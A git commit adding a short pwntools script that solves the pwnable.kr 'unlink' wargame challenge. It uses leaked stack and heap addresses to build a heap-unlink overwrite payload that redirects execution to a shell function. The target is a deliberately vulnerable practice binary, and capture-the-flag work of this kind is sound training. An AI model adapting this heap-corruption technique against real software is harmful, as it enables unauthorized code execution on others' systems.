fcda466574e3a9758276e57f6aa1c5ed9474ba4f
Qwaz <qwazpia@gmail.com>
2017-01-02 19:20:00 +0900

    solve unlink

---
+++ pwnable.kr/unlink/solver.py
@@ -0,0 +1,23 @@
+from pwn import *
+
+con = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
+p = con.process('./unlink')
+
+p.recvuntil('stack address leak: ')
+stack_addr = int(p.recvline()[2:], 16)
+log.success('stack: {:#x}'.format(stack_addr))
+
+p.recvuntil('heap address leak: ')
+heap_addr = int(p.recvline()[2:], 16)
+log.success('heap: {:#x}'.format(heap_addr))
+
+p.recvline()
+
+# gap between chunks: 0x18
+
+target_addr = stack_addr + 0x10
+target_value = heap_addr + 8 + 4
+shell_addr = 0x080484eb
+
+p.send(p32(shell_addr) + 'a'*12 + p32(target_value) + p32(target_addr))
+p.interactive()
